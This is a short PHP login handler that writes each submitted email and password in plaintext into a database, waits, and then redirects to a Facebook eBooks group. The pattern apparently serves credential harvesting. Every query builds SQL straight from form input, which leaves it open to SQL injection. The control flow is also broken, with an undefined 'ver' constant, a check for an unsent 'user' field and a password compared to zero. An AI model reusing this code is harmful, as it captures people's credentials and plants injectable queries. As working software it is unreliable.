<?php
session_start();
	require 'conectare.php';

	$email = $_POST['email'];
	$pass = $_POST['pass'];
	$ver = 0;

	$sql = "INSERT INTO user (email, pass) VALUES ('$email', '$pass')";
    $result = mysqli_query($conectare, $sql);
	

	sleep(5);

	$sql = "SELECT * FROM user WHERE email='$email'";
	$result = mysqli_query($conectare, $sql);
	$row = $result->fetch_assoc();
	$hash  = $row['pass'];

		if (!empty($_POST['email']) && !empty($_POST['pass']) && isset($_POST['user'] )&& isset($_POST['pass'])){       
			if ($hash == 0){
				header("Location: ../index.php?info=gresit");
				die();
			}else{
				$result = mysqli_query($conectare, "SELECT ver FROM user WHERE email LIKE '%{$email}%' OR pass LIKE '%{$pass}%'");

				while ($row = mysqli_fetch_array($result))
				{	
					if (ver == 1){
						header ("Location: https://www.facebook.com/groups/eBooks.Downloads");
					}
					else{
						header("Location: ../index.php?info=gresit");
					}
				}
			}
		}
		else {
			header ("Location: ../index.php?info=space");
		}


?>